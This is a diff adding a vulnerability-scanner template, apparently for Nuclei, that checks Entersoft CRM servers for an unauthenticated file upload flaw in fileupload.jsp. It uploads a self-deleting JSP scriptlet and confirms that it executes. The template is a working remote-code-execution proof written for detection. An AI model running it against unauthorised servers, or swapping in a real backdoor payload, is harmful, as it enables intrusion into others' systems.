@@ -1,0 +1,38 @@
+id: entersoft-fileupload-vuln
+info:
+  name: Entersoft Customer Resource Management System File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Entersoft Customer Resource Management System has a file upload vulnerability in `fileupload.jsp` that allows attackers to upload a backdoor, execute code, and potentially control the entire web server.
+  reference:
+    - http://www.entersoft.cn/
+  tags: fileupload, rce
+http:
+  - raw:
+      - |
+        POST /entsoft_en/entereditor/jsp/fileupload.jsp?filename={{random_filename}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        {{random_content}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        GET /enterdoc/uploadfile/{{random_filename}} HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "hello"
+variables:
+  random_filename: '{{rand_base(10)}}.jsp'
+  random_content: '<% out.println("hello"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>'
